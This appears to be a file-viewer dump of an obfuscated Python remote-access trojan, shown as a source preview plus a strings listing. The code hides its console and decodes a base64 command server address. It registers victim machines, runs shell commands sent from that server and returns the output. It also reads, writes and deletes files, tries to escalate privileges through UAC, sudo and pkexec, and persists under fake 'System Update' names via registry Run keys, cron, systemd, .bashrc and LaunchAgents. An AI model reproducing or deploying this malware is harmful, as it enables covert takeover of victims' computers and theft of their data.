@@ -1,0 +1,939 @@
+File: Python ViVi Not Encr...py
+Path: C:/Users/aymen/OneDrive/Desktop/Backups/ViVi/Python ViVi Not Encr...py
+Size: 27,983 bytes
+SHA-256: ebc6409dcf99f9f83ba13829122afcceb81e714aad1e21a7ef8399113448101e
+
+File type: Python source code
+Lines: 735
+Characters: 24281
+
+Python source preview (first 250 lines):
+import socket as _s0
+import os as _s1
+import sys as _s2
+import time as _s3
+import base64 as _s5
+import platform as _s6
+import subprocess as _s7
+import ctypes as _sa
+import shutil as _s9
+import requests as _sc
+import threading as _s8
+import io as _sb
+
+# ═══════════════════════════════════════════════════════════════════
+# ⚙️ CONFIG
+# ═══════════════════════════════════════════════════════════════════
+_K = "aHR0cHM6Ly9wcm9tYWwuYXltZW5saW51eC53b3JrZXJzLmRldg=="
+_U = _s5.b64decode(_K.encode()).decode()
+
+_R = 180
+_P = 5
+_Q = 15
+_F = 5
+
+_E = False
+_FPS = 30
+_QUAL = 40
+_WIDTH = 1280
+
+_A = False
+_N = 0
+_LOCK = _s8.Lock()
+
+_W = _s6.system() == "Windows"
+_L = _s6.system() == "Linux"
+_M = _s6.system() == "Darwin"
+
+_START_TIME = _s3.time()
+
+# ═══════════════════════════════════════════════════════════════════
+# 🕵️ HIDE CONSOLE (Windows)
+# ═══════════════════════════════════════════════════════════════════
+if _W:
+    try:
+        _kernel32 = _sa.windll.kernel32
+        _user32 = _sa.windll.user32
+        _hwnd = _kernel32.GetConsoleWindow()
+        if _hwnd:
+            _user32.ShowWindow(_hwnd, 0)
+    except:
+        pass
+
+try:
+    _null = open(_s1.devnull, 'w')
+    _s2.stdout = _null
+    _s2.stderr = _null
+except:
+    pass
+
+# ═══════════════════════════════════════════════════════════════════
+# 🆔 BOT ID
+# ═══════════════════════════════════════════════════════════════════
+def _x0():
+    try:
+        _h = _s0.gethostname()
+        _u = _s1.environ.get('USERNAME') or _s1.environ.get('USER') or _s1.environ.get('LOGNAME') or 'user'
+        _b = _h + "_" + _u
+        return ''.join(c for c in _b if c.isalnum() or c in '_-')
+    except:
+        return "unknown_bot"
+
+_I = _x0()
+
+# ═══════════════════════════════════════════════════════════════════
+# 🏓 PING
+# ═══════════════════════════════════════════════════════════════════
+def _x1():
+    try:
+        _t0 = _s3.time()
+        _sc.get(_U, timeout=5)
+        return int((_s3.time() - _t0) * 1000)
+    except:
+        return 999
+
+# ═══════════════════════════════════════════════════════════════════
+# 📡 REGISTER
+# ═══════════════════════════════════════════════════════════════════
+def _x2():
+    global _A, _N
+    try:
+        _p = _x1()
+        _uid = _s1.geteuid() if hasattr(_s1, 'geteuid') else 0
+        _d = {
+            "id": _I,
+            "hostname": _s0.gethostname(),
+            "user": _s1.environ.get('USERNAME') or _s1.environ.get('USER') or 'unknown',
+            "os": _s6.system() + " " + _s6.release(),
+            "cwd": _s1.getcwd(),
+            "ping": _p,
+            "uid": _uid,
+        }
+        _r = _sc.post(_U + "/register", json=_d, timeout=_Q)
+        with _LOCK:
+            _N += 1
+        if _r.status_code == 200:
+            try:
+                if _r.json().get("status") == "ok":
+                    _A = True
+                    return True
+            except:
+                pass
+        _A = False
+        return False
+    except:
+        _A = False
+        return False
+
+# ═══════════════════════════════════════════════════════════════════
+# 📡 GET COMMAND
+# ═══════════════════════════════════════════════════════════════════
+def _x3():
+    global _A
+    try:
+        _r = _sc.get(_U + "/get_command/" + _I, timeout=_Q)
+        if _r.status_code == 200:
+            _A = True
+            return _r.json()
+        return {"command": ""}
+    except:
+        return {"command": ""}
+
+# ═══════════════════════════════════════════════════════════════════
+# 📤 SEND RESULT
+# ═══════════════════════════════════════════════════════════════════
+def _x4(_r, _t):
+    try:
+        _p = _x1()
+        _sc.post(_U + "/send_result", json={
+            "bot_id": _I,
+            "result": _r,
+            "task_id": _t,
+            "cwd": _s1.getcwd(),
+            "ping": _p,
+        }, timeout=_Q)
+        return True
+    except:
+        return False
+
+# ═══════════════════════════════════════════════════════════════════
+# 🖥️ RUN (Cross-Platform)
+# ═══════════════════════════════════════════════════════════════════
+def _run(_c):
+    try:
+        if _W:
+            _pr = _s7.Popen(
+                _c,
+                shell=True,
+                stdout=_s7.PIPE,
+                stderr=_s7.STDOUT,
+                stdin=_s7.DEVNULL,
+                creationflags=0x08000000,
+            )
+        elif _L or _M:
+            _c = "timeout 60 " + _c
+            _pr = _s7.Popen(
+                _c,
+                shell=True,
+                stdout=_s7.PIPE,
+                stderr=_s7.STDOUT,
+                stdin=_s7.DEVNULL,
+                executable='/bin/bash' if _L else '/bin/zsh',
+            )
+        else:
+            return "[Unsupported OS]"
+        
+        _ou, _ = _pr.communicate()
+        try:
+            _ou = _ou.decode('utf-8', errors='ignore')
+        except:
+            pass
+        return _ou if _ou and _ou.strip() else "[Command executed - no output]"
+    except:
+        return "[Error executing command]"
+
+# ═══════════════════════════════════════════════════════════════════
+# 👑 ADMIN (Cross-Platform)
+# ═══════════════════════════════════════════════════════════════════
+def _admin():
+    global _A
+    
+    try:
+        if _W:
+            if _sa.windll.shell32.IsUserAnAdmin():
+                return "Already Administrator"
+            
+            _script = _s1.path.abspath(_s2.argv[0])
+            _result = _sa.windll.shell32.ShellExecuteW(
+                None, "runas", _s2.executable,
+                f'"{_script}"', None, 1
+            )
+            if _result > 32:
+                _s3.sleep(2)
+                _s2.exit(0)
+            return "UAC prompt shown"
+        
+        elif _L or _M:
+            if _s1.geteuid() == 0:
+                return "Already root (uid=0)"
+            
+            _script = _s1.path.abspath(_s2.argv[0])
+            _has_display = bool(_s1.environ.get('DISPLAY'))
+            _old_pid = _s1.getpid()
+            
+            try:
+                _s7.check_output(['sudo', '-n', 'true'], stderr=_s7.DEVNULL, timeout=3)
+                _s7.Popen(['sudo', '-n', _s2.executable, _script],
+                          stdout=_s7.DEVNULL, stderr=_s7.DEVNULL,
+                          start_new_session=True)
+                _s3.sleep(2)
+                try:
+                    _s7.Popen(['kill', '-9', str(_old_pid)])
+                except:
+                    pass
+                _s2.exit(0)
+            except:
+                pass
+            
+            if _has_display:
+                try:
+                    _s7.Popen(['pkexec', _s2.executable, _script],
+                              stdout=_s7.DEVNULL, stderr=_s7.DEVNULL,
+                              start_new_session=True)
+                    _s3.sleep(3)
+                    try:
+                        _s7.Popen(['kill', '-9', str(_old_pid)])
+                    except:
+                        pass
+                    _s2.exit(0)
+                except:
+                    pass
+            
+            if _has_display:
+                try:
+                    _s7.Popen(['xterm', '-e', 'sudo', _s2.executable, _script],
+                              stdout=_s7.DEVNULL, stderr=_s7.DEVNULL,
+                              start_new_session=True)
+                    _s3.sleep(3)
+                    try:
+                        _s7.Popen(['kill', '-9', str(_old_pid)])
+                    except:
+
+Note: source is displayed as text; it is not executed.
+
+--- STRINGS ---
+0x00000000  import socket as _s0
+0x00000016  import os as _s1
+0x00000028  import sys as _s2
+0x0000003B  import time as _s3
+0x0000004F  import base64 as _s5
+0x00000065  import platform as _s6
+0x0000007D  import subprocess as _s7
+0x00000097  import ctypes as _sa
+0x000000AD  import shutil as _s9
+0x000000C3  import requests as _sc
+0x000000DB  import threading as _s8
+0x000000F4  import io as _sb
+0x000001DD   CONFIG
+0x000002B3  _K = "aHR0cHM6Ly9wcm9tYWwuYXltZW5saW51eC53b3JrZXJzLmRldg=="
+0x000002F0  _U = _s5.b64decode(_K.encode()).decode()
+0x0000031C  _R = 180
+0x00000326  _P = 5
+0x0000032E  _Q = 15
+0x00000337  _F = 5
+0x00000341  _E = False
+0x0000034D  _FPS = 30
+0x00000358  _QUAL = 40
+0x00000364  _WIDTH = 1280
+0x00000375  _A = False
+0x00000381  _N = 0
+0x00000389  _LOCK = _s8.Lock()
+0x0000039F  _W = _s6.system() == "Windows"
+0x000003BF  _L = _s6.system() == "Linux"
+0x000003DD  _M = _s6.system() == "Darwin"
+0x000003FE  _START_TIME = _s3.time()
+0x000004F0   HIDE CONSOLE (Windows)
+0x000005D6  if _W:
+0x000005DE      try:
+0x000005E8          _kernel32 = _sa.windll.kernel32
+0x00000611          _user32 = _sa.windll.user32
+0x00000636          _hwnd = _kernel32.GetConsoleWindow()
+0x00000664          if _hwnd:
+0x00000677              _user32.ShowWindow(_hwnd, 0)
+0x000006A1      except:
+0x000006AE          pass
+0x000006C4      _null = open(_s1.devnull, 'w')
+0x000006E8      _s2.stdout = _null
+0x00000700      _s2.stderr = _null
+0x00000718  except:
+0x00000721      pass
+0x00000800   BOT ID
+0x000008D6  def _x0():
+0x000008E2      try:
+0x000008EC          _h = _s0.gethostname()
+0x0000090C          _u = _s1.environ.get('USERNAME') or _s1.environ.get('USER') or _s1.environ.get('LOGNAME') or 'user'
+0x00000979          _b = _h + "_" + _u
+0x00000995          return ''.join(c for c in _b if c.isalnum() or c in '_-')
+0x000009D8      except:
+0x000009E5          return "unknown_bot"
+0x00000A05  _I = _x0()
+0x00000AE6   PING
+0x00000BBA  def _x1():
+0x00000BC6      try:
+0x00000BD0          _t0 = _s3.time()
+0x00000BEA          _sc.get(_U, timeout=5)
+0x00000C0A          return int((_s3.time() - _t0) * 1000)
+0x00000C39      except:
+0x00000C46          return 999
+0x00000D2F   REGISTER
+0x00000E07  def _x2():
+0x00000E13      global _A, _N
+0x00000E26      try:
+0x00000E30          _p = _x1()
+0x00000E44          _uid = _s1.geteuid() if hasattr(_s1, 'geteuid') else 0
+0x00000E84          _d = {
+0x00000E94              "id": _I,
+0x00000EAB              "hostname": _s0.gethostname(),
+0x00000ED7              "user": _s1.environ.get('USERNAME') or _s1.environ.get('USER') or 'unknown',
+0x00000F31              "os": _s6.system() + " " + _s6.release(),
+0x00000F68              "cwd": _s1.getcwd(),
+0x00000F8A              "ping": _p,
+0x00000FA3              "uid": _uid,
+0x00000FBD          }
+0x00000FC8          _r = _sc.post(_U + "/register", json=_d, timeout=_Q)
+0x00001006          with _LOCK:
+0x0000101B              _N += 1
+0x00001030          if _r.status_code == 200:
+0x00001053              try:
+0x00001065                  if _r.json().get("status") == "ok":
+0x0000109A                      _A = True
+0x000010B9                      return True
+0x000010DA              except:
+0x000010EF                  pass
+0x00001105          _A = False
+0x00001119          return False
+0x0000112F      except:
+0x0000113C          _A = False
+0x00001150          return False
+0x0000123B   GET COMMAND
+0x00001316  def _x3():
+0x00001322      global _A
+0x00001331      try:
+0x0000133B          _r = _sc.get(_U + "/get_command/" + _I, timeout=_Q)
+0x00001378          if _r.status_code == 200:
+0x0000139B              _A = True
+0x000013B2              return _r.json()
+0x000013D0          return {"command": ""}
+0x000013F0      except:
+0x000013FD          return {"command": ""}
+0x000014F2   SEND RESULT
+0x000015CD  def _x4(_r, _t):
+0x000015DF      try:
+0x000015E9          _p = _x1()
+0x000015FD          _sc.post(_U + "/send_result", json={
+0x0000162B              "bot_id": _I,
+0x00001646              "result": _r,
+0x00001661              "task_id": _t,
+0x0000167D              "cwd": _s1.getcwd(),
+0x0000169F              "ping": _p,
+0x000016B8          }, timeout=_Q)
+0x000016D0          return True
+0x000016E5      except:
+0x000016F2          return False
+0x000017E0   RUN (Cross-Platform)
+0x000018C4  def _run(_c):
+0x000018D3      try:
+0x000018DD          if _W:
+0x000018ED              _pr = _s7.Popen(
+0x0000190B                  _c,
+0x00001920                  shell=True,
+0x0000193D                  stdout=_s7.PIPE,
+0x0000195F                  stderr=_s7.STDOUT,
+0x00001983                  stdin=_s7.DEVNULL,
+0x000019A7                  creationflags=0x08000000,
+0x000019D2              )
+0x000019E1          elif _L or _M:
+0x000019F9              _c = "timeout 60 " + _c
+0x00001A1E              _pr = _s7.Popen(
+0x00001A3C                  _c,
+0x00001A51                  shell=True,
+0x00001A6E                  stdout=_s7.PIPE,
+0x00001A90                  stderr=_s7.STDOUT,
+0x00001AB4                  stdin=_s7.DEVNULL,
+0x00001AD8                  executable='/bin/bash' if _L else '/bin/zsh',
+0x00001B17              )
+0x00001B26          else:
+0x00001B35              return "[Unsupported OS]"
+0x00001B5C          
+0x00001B66          _ou, _ = _pr.communicate()
+0x00001B8A          try:
+0x00001B98              _ou = _ou.decode('utf-8', errors='ignore')
+0x00001BD0          except:
+0x00001BE1              pass
+0x00001BF3          return _ou if _ou and _ou.strip() else "[Command executed - no output]"
+0x00001C44      except:
+0x00001C51          return "[Error executing command]"
+0x00001D52   ADMIN (Cross-Platform)
+0x00001E38  def _admin():
+0x00001E47      global _A
+0x00001E5C      try:
+0x00001E66          if _W:
+0x00001E76              if _sa.windll.shell32.IsUserAnAdmin():
+0x00001EAA                  return "Already Administrator"
+0x00001EDA              
+0x00001EE8              _script = _s1.path.abspath(_s2.argv[0])
+0x00001F1D              _result = _sa.windll.shell32.ShellExecuteW(
+0x00001F56                  None, "runas", _s2.executable,
+0x00001F86                  f'"{_script}"', None, 1
+0x00001FAF              )
+0x00001FBE              if _result > 32:
+0x00001FDC                  _s3.sleep(2)
+0x00001FFA                  _s2.exit(0)
+0x00002017              return "UAC prompt shown"
+0x0000203E          
+0x00002048          elif _L or _M:
+0x00002060              if _s1.geteuid() == 0:
+0x00002084                  return "Already root (uid=0)"
+0x000020B3              
+0x000020C1              _script = _s1.path.abspath(_s2.argv[0])
+0x000020F6              _has_display = bool(_s1.environ.get('DISPLAY'))
+0x00002133              _old_pid = _s1.getpid()
+0x00002158              
+0x00002166              try:
+0x00002178                  _s7.check_output(['sudo', '-n', 'true'], stderr=_s7.DEVNULL, timeout=3)
+0x000021D1                  _s7.Popen(['sudo', '-n', _s2.executable, _script],
+0x00002215                            stdout=_s7.DEVNULL, stderr=_s7.DEVNULL,
+0x00002258                            start_new_session=True)
+0x0000228B                  _s3.sleep(2)
+0x000022A9                  try:
+0x000022BF                      _s7.Popen(['kill', '-9', str(_old_pid)])
+0x000022FD                  except:
+0x00002316                      pass
+0x00002330                  _s2.exit(0)
+0x0000234D              except:
+0x00002362                  pass
+0x00002378              
+0x00002386              if _has_display:
+0x000023A4                  try:
+0x000023BA                      _s7.Popen(['pkexec', _s2.executable, _script],
+0x000023FE                                stdout=_s7.DEVNULL, stderr=_s7.DEVNULL,
+0x00002445                                start_new_session=True)
+0x0000247C                      _s3.sleep(3)
+0x0000249E                      try:
+0x000024B8                          _s7.Popen(['kill', '-9', str(_old_pid)])
+0x000024FA                      except:
+0x00002517                          pass
+0x00002535                      _s2.exit(0)
+0x00002556                  except:
+0x0000256F                      pass
+0x00002589              
+0x00002597              if _has_display:
+0x000025B5                  try:
+0x000025CB                      _s7.Popen(['xterm', '-e', 'sudo', _s2.executable, _script],
+0x0000261C                                stdout=_s7.DEVNULL, stderr=_s7.DEVNULL,
+0x00002663                                start_new_session=True)
+0x0000269A                      _s3.sleep(3)
+0x000026BC                      try:
+0x000026D6                          _s7.Popen(['kill', '-9', str(_old_pid)])
+0x00002718                      except:
+0x00002735                          pass
+0x00002753                      _s2.exit(0)
+0x00002774                  except:
+0x0000278D                      pass
+0x000027A7              
+0x000027B5              if _has_display and _L:
+0x000027DA                  try:
+0x000027F0                      _s7.Popen(['gnome-terminal', '--', 'sudo', _s2.executable, _script],
+0x0000284A                                stdout=_s7.DEVNULL, stderr=_s7.DEVNULL,
+0x00002891                                start_new_session=True)
+0x000028C8                      _s3.sleep(3)
+0x000028EA                      try:
+0x00002904                          _s7.Popen(['kill', '-9', str(_old_pid)])
+0x00002946                      except:
+0x00002963                          pass
+0x00002981                      _s2.exit(0)
+0x000029A2                  except:
+0x000029BB                      pass
+0x000029D5              
+0x000029E3              return "Cannot escalate"
+0x00002A09          
+0x00002A13          else:
+0x00002A22              return "Unsupported OS"
+0x00002A4D      except Exception as _e:
+0x00002A6A          return f"Admin error: {_e}"
+0x00002B64   VIRUS
+0x00002C39  def _virus():
+0x00002C48      try:
+0x00002C52          _script = _s1.path.abspath(_s2.argv[0])
+0x00002C83          _uid = _s1.geteuid() if hasattr(_s1, 'geteuid') else 0
+0x00002CC3          _pid = _s1.getpid() if hasattr(_s1, 'getpid') else 0
+0x00002D01          _ppid = _s1.getppid() if hasattr(_s1, 'getppid') else 0
+0x00002D42          
+0x00002D4C          _runtime = int(_s3.time() - _START_TIME)
+0x00002D7E          _hours = _runtime // 3600
+0x00002DA1          _mins = (_runtime % 3600) // 60
+0x00002DCA          _secs = _runtime % 60
+0x00002DE9          
+0x00002DF3          _info = [
+0x00002E06              "=== VIRUS INFO ===",
+0x00002E29              "  Script:    " + _script,
+0x00002E51              "  PID:       " + str(_pid),
+0x00002E7B              "  PPID:      " + str(_ppid),
+0x00002EA6              "  UID:       " + str(_uid),
+0x00002ED0              "  User:      " + (_s1.environ.get('USERNAME') or _s1.environ.get('USER') or 'unknown'),
+0x00002F36              "  Hostname:  " + _s0.gethostname(),
+0x00002F68              "  CWD:       " + _s1.getcwd(),
+0x00002F95              "  Bot ID:    " + _I,
+0x00002FB8              "  Python:    " + _s6.python_version(),
+0x00002FED              "  Platform:  " + _s6.system() + " " + _s6.release(),
+0x00003030              "  Arch:      " + _s6.machine(),
+0x0000305E              "  Runtime:   " + f"{_hours}h {_mins}m {_secs}s",
+0x0000309D              "  Registers: " + str(_N),
+0x000030C5              "  Connected: " + str(_A),
+0x000030ED          ]
+0x000030F8          
+0x00003102          if _W:
+0x00003112              _startup = _s1.path.join(
+0x00003139                  _s1.environ.get('APPDATA', ''),
+0x0000316A                  'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
+0x000031B7              )
+0x000031C6              _info.append("  Startup:   " + _startup)
+0x000031FC              _info.append("  Registry:  HKCU\\...\\Run")
+0x00003235          else:
+0x00003244              _info.append("  Cron:      crontab -l")
+0x00003279              _info.append("  systemd:   systemctl --user status sys-update")
+0x000032C6          
+0x000032D0          _info.append("===================")
+0x000032FD          return "\n".join(_info)
+0x0000331E      except Exception as _e:
+0x0000333B          return f"Virus error: {_e}"
+0x00003435   EXECUTE
+0x0000350C  def _xa(_c):
+0x0000351A      global _E, _FPS, _QUAL, _WIDTH, _A
+0x00003548      _c = _c.strip()
+0x0000355D      if not _c:
+0x0000356D          return "[Empty]"
+0x0000358D      # 
+0x0000359C   Basic 
+0x000035AE      if _c == "pwd":
+0x000035C3          return _s1.getcwd()
+0x000035E0      if _c == "cd":
+0x000035F4          return _s1.getcwd()
+0x00003611      if _c.startswith("cd "):
+0x0000362F          _p = _c[3:].strip()
+0x0000364C          if _p == "~":
+0x00003663              _p = _s1.path.expanduser("~")
+0x0000368E          try:
+0x0000369C              _s1.chdir(_p)
+0x000036B7              return "Changed to: " + _s1.getcwd()
+0x000036E9          except:
+0x000036FA              return "[cd failed]"
+0x0000371C      if _c == "whoami":
+0x00003734          return _s1.environ.get('USERNAME') or _s1.environ.get('USER') or 'unknown'
+0x00003788      if _c == "hostname":
+0x000037A2          return _s0.gethostname()
+0x000037C4      if _c in ("exit", "quit", "kill"):
+0x000037EC          return "EXIT_SIGNAL"
+0x00003810      # 
+0x0000381F   VIRUS 
+0x00003831      if _c == "virus":
+0x00003848          return _virus()
+0x00003867      # 
+0x00003876   SYSINFO 
+0x0000388A      if _c in ("sysinfo", "system", "info"):
+0x000038B7          _uid = _s1.geteuid() if hasattr(_s1, 'geteuid') else 0
+0x000038F7          _i = [
+0x00003907              "=== SYSTEM INFO ===",
+0x0000392B              "  OS:          " + _s6.system() + " " + _s6.release(),
+0x00003970              "  Arch:        " + _s6.machine(),
+0x000039A0              "  Python:      " + _s6.python_version(),
+0x000039D7              "  Hostname:    " + _s0.gethostname(),
+0x00003A0B              "  User:        " + (_s1.environ.get('USERNAME') or _s1.environ.get('USER') or 'unknown'),
+0x00003A73              "  UID:         " + str(_uid),
+0x00003A9F              "  CWD:         " + _s1.getcwd(),
+0x00003ACE              "  Bot ID:      " + _I,
+0x00003AF3              "  Connected:   " + str(_A),
+0x00003B1D              "  Registers:   " + str(_N),
+0x00003B47              "  Script:      " + _s1.path.abspath(_s2.argv[0]),
+0x00003B87              "==================="
+0x00003BAA          ]
+0x00003BB5          return "\n".join(_i)
+0x00003BD9      # 
+0x00003BE8   FILES 
+0x00003BF2   ls with PATH 
+0x00003C0B      if _c.startswith("ls ") or _c.startswith("dir "):
+0x00003C42          _p = _c.split(" ", 1)[1].strip()
+0x00003C6C          try:
+0x00003C7A              _fs = sorted(_s1.listdir(_p))
+0x00003CA5              if not _fs:
+0x00003CBE                  return "[Empty directory]"
+0x00003CEA              _rs = []
+0x00003D00              for _f in _fs:
+0x00003D1C                  _fp = _s1.path.join(_p, _f)
+0x00003D49                  try:
+0x00003D5F                      if _s1.path.isdir(_fp):
+0x00003D8C                          _rs.append("[DIR]  " + _f + "/")
+0x00003DC6                      else:
+0x00003DE1                          _sz = _s1.path.getsize(_fp)
+0x00003E16                          _rs.append("[FILE] " + _f + " (" + str(_sz) + "B)")
+0x00003E63                  except:
+0x00003E7C                      _rs.append("[?]    " + _f)
+0x00003EAC              return "\n".join(_rs)
+0x00003ECF          except Exception as _e:
+0x00003EF0              return "Error: " + str(_e)
+0x00003F1E      # 
+0x00003F2D   FILES 
+0x00003F37   ls without path 
+0x00003F53      if _c in ("ls", "dir"):
+0x00003F70          try:
+0x00003F7E              _fs = sorted(_s1.listdir("."))
+0x00003FAA              if not _fs:
+0x00003FC3                  return "[Empty directory]"
+0x00003FEF              _rs = []
+0x00004005              for _f in _fs:
+0x00004021                  try:
+0x00004037                      if _s1.path.isdir(_f):
+0x00004063                          _rs.append("[DIR]  " + _f + "/")
+0x0000409D                      else:
+0x000040B8                          _sz = _s1.path.getsize(_f)
+0x000040EC                          _rs.append("[FILE] " + _f + " (" + str(_sz) + "B)")
+0x00004139                  except:
+0x00004152                      _rs.append("[?]    " + _f)
+0x00004182              return "\n".join(_rs)
+0x000041A5          except:
+0x000041B6              return "[ls failed]"
+0x000041DE      if _c.startswith("cat ") or _c.startswith("type "):
+0x00004217          _p = _c.split(" ", 1)
+0x00004236          if len(_p) < 2:
+0x0000424F              return "Usage: cat <file>"
+0x00004277          try:
+0x00004285              with open(_p[1].strip(), 'r', encoding='utf-8', errors='replace') as _f:
+0x000042DB                  _ct = _f.read()
+0x000042FC              if len(_ct) > 5000:
+0x0000431D                  return _ct[:5000] + "\n\n[...truncated]"
+0x00004357              return _ct if _ct else "[Empty file]"
+0x0000438A          except:
+0x0000439B              return "[cat failed]"
+0x000043C4      if _c.startswith("write "):
+0x000043E5          _p = _c.split(" ", 2)
+0x00004404          if len(_p) < 3:
+0x0000441D              return "Usage: write <file> <content>"
+0x00004451          try:
+0x0000445F              with open(_p[1], 'w', encoding='utf-8') as _f:
+0x0000449B                  _f.write(_p[2])
+0x000044BC              return "Written to " + _p[1]
+0x000044E6          except:
+0x000044F7              return "[write failed]"
+0x00004522      if _c.startswith("rm ") or _c.startswith("del "):
+0x00004559          _p = _c.split(" ", 1)
+0x00004578          if len(_p) < 2:
+0x00004591              return "Usage: rm <path>"
+0x000045B8          _pp = _p[1].strip()
+0x000045D5          try:
+0x000045E3              if _s1.path.isdir(_pp):
+0x00004608                  _s9.rmtree(_pp)
+0x00004629                  return "Deleted directory: " + _pp
+0x0000465D              else:
+0x00004670                  _s1.remove(_pp)
+0x00004691                  return "Deleted file: " + _pp
+0x000046C0          except:
+0x000046D1              return "[rm failed]"
+0x000046F9      if _c.startswith("mkdir "):
+0x0000471A          _p = _c[6:].strip()
+0x00004737          try:
+0x00004745              _s1.makedirs(_p, exist_ok=True)
+0x00004772              return "Created directory: " + _p
+0x000047A1          except:
+0x000047B2              return "[mkdir failed]"
+0x000047DD      # 
+0x000047EC   READ B64 
+0x00004801      if _c.startswith("readb64 "):
+0x00004824          _p = _c[8:].strip()
+0x00004841          try:
+0x0000484F              with open(_p, 'rb') as _f:
+0x00004877                  _dt = _f.read()
+0x00004898              return _s5.b64encode(_dt).decode('ascii')
+0x000048CF          except Exception as _e:
+0x000048F0              return "[readb64 failed: " + str(_e) + "]"
+0x0000492E      # 
+0x0000493D   WRITE B64 
+0x00004953      if _c.startswith("writeb64 "):
+0x00004977          _p = _c.split(" ", 2)
+0x00004996          if len(_p) < 3:
+0x000049AF              return "Usage: writeb64 <path> <base64>"
+0x000049E5          try:
+0x000049F3              _dt = _s5.b64decode(_p[2])
+0x00004A1B              with open(_p[1], 'wb') as _f:
+0x00004A46                  _f.write(_dt)
+0x00004A65              return "File written: " + _p[1]
+0x00004A92          except Exception as _e:
+0x00004AB3              return "[writeb64 failed: " + str(_e) + "]"
+0x00004AF2      # 
+0x00004B01   NETWORK 
+0x00004B15      if _c in ("myip", "publicip"):
+0x00004B39          try:
+0x00004B47              _r = _sc.get("https://api.ipify.org", timeout=5)
+0x00004B85              return "Public IP: " + _r.text
+0x00004BB1          except:
+0x00004BC2              return "[myip failed]"
+0x00004BEC      if _c == "ping":
+0x00004C02          return "Bot ID: " + _I + "\nConnected: " + str(_A) + "\nRegisters: " + str(_N)
+0x00004C60      # 
+0x00004C6F   PROCESSES 
+0x00004C85      if _c in ("ps", "processes", "tasklist"):
+0x00004CB4          try:
+0x00004CC2              import psutil as _pu
+0x00004CE4              _pr = ["PID      CPU   MEM   NAME"]
+0x00004D15              for _p in _pu.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
+0x00004D70                  try:
+0x00004D86                      _pr.append(str(_p.info['pid']).ljust(9) + str(round(_p.info['cpu_percent'], 1)).ljust(7) + str(round(_p.info['memory_percent'], 1)).ljust(7) + _p.info['name'][:40])
+0x00004E40                  except:
+0x00004E59                      pass
+0x00004E73                  if len(_pr) > 30:
+0x00004E96                      break
+0x00004EB1              return "\n".join(_pr)
+0x00004ED4          except ImportError:
+0x00004EF1              return "psutil not installed"
+0x00004F22      # 
+0x00004F31   ADMIN 
+0x00004F43      if _c == "admin":
+0x00004F5A          return _admin()
+0x00004F79      # 
+0x00004F88   PERSIST 
+0x00004F9C      if _c == "persist":
+0x00004FB5          try:
+0x00004FC3              _sp = _s1.path.abspath(_s2.argv[0])
+0x00004FF4              
+0x00005002              if _W:
+0x00005016                  _st = _s1.path.join(_s1.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+0x00005098                  _de = _s1.path.join(_st, _s1.path.basename(_sp))
+0x000050DA                  _s9.copy(_sp, _de)
+0x000050FE                  
+0x00005110                  try:
+0x00005126                      import winreg
+0x00005149                      _key = winreg.OpenKey(
+0x00005175                          winreg.HKEY_CURRENT_USER,
+0x000051A8                          r"Software\Microsoft\Windows\CurrentVersion\Run",
+0x000051F3                          0, winreg.KEY_SET_VALUE
+0x00005224                      )
+0x0000523B                      winreg.SetValueEx(_key, "SystemUpdate", 0, winreg.REG_SZ, _sp)
+0x0000528F                      winreg.CloseKey(_key)
+0x000052BA                  except:
+0x000052D3                      pass
+0x000052ED                  
+0x000052FF                  return "Persistence (Windows): " + _de
+0x00005337              
+0x00005345              elif _L:
+0x0000535B                  _msgs = []
+0x00005377                  
+0x00005389                  try:
+0x0000539F                      _cr = "@reboot python3 " + _sp + " &"
+0x000053DA                      _s1.system('(crontab -l 2>/dev/null; echo "' + _cr + '") | crontab -')
+0x00005436                      _msgs.append("Cron")
+0x00005460                  except:
+0x00005479                      pass
+0x00005493                  
+0x000054A5                  try:
+0x000054BB                      _sd = """[Unit]
+0x000054E0  Description=System Update
+0x000054FB  After=network.target
+0x00005513  [Service]
+0x0000551E  Type=simple
+0x0000552B  ExecStart=/usr/bin/python3 """ + _sp + """
+0x00005557  Restart=always
+0x00005567  RestartSec=10
+0x00005578  [Install]
+0x00005583  WantedBy=default.target
+0x000055A1                      _sdp = _s1.path.expanduser("~/.config/systemd/user/sys-update.service")
+0x000055FE                      _s1.makedirs(_s1.path.dirname(_sdp), exist_ok=True)
+0x00005647                      with open(_sdp, 'w') as _f:
+0x00005678                          _f.write(_sd)
+0x0000569F                      _s1.system('systemctl --user daemon-reload 2>/dev/null')
+0x000056ED                      _s1.system('systemctl --user enable sys-update.service 2>/dev/null')
+0x00005747                      _msgs.append("systemd")
+0x00005774                  except:
+0x0000578D                      pass
+0x000057A7                  
+0x000057B9                  try:
+0x000057CF                      _brc = _s1.path.expanduser("~/.bashrc")
+0x0000580C                      with open(_brc, 'a') as _f:
+0x0000583D                          _f.write("\n# System Update\npython3 " + _sp + " &\n")
+0x0000588D                      _msgs.append(".bashrc")
+0x000058BA                  except:
+0x000058D3                      pass
+0x000058ED                  
+0x000058FF                  return "Persistence (Linux): " + ", ".join(_msgs)
+0x00005942              
+0x00005950              elif _M:
+0x00005966                  _la_dir = _s1.path.expanduser("~/Library/LaunchAgents")
+0x000059AF                  _s1.makedirs(_la_dir, exist_ok=True)
+0x000059E5                  
+0x000059F7                  _plist = """<?xml version="1.0" encoding="UTF-8"?>
+0x00005A3B  <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+0x00005AA3  <plist version="1.0">
+0x00005ABA  <dict>
+0x00005AC2      <key>Label</key>
+0x00005AD8      <string>com.sys.update</string>
+0x00005AFD      <key>ProgramArguments</key>
+0x00005B1E      <array>
+0x00005B2B          <string>/usr/bin/python3</string>
+0x00005B56          <string>""" + _sp + """</string>
+0x00005B80      </array>
+0x00005B8E      <key>RunAtLoad</key>
+0x00005BA8      <true/>
+0x00005BB5      <key>KeepAlive</key>
+0x00005BCF      <true/>
+0x00005BDC  </dict>
+0x00005BE5  </plist>
+0x00005BF4                  _plp = _s1.path.join(_la_dir, "com.sys.update.plist")
+0x00005C3B                  with open(_plp, 'w') as _f:
+0x00005C68                      _f.write(_plist)
+0x00005C8E                  
+0x00005CA0                  _s1.system(f'launchctl load "{_plp}" 2>/dev/null')
+0x00005CE4                  return "Persistence (macOS): " + _plp
+0x00005D1B              
+0x00005D29              return "[Unsupported OS]"
+0x00005D50          except Exception as _e:
+0x00005D71              return f"[persist failed: {_e}]"
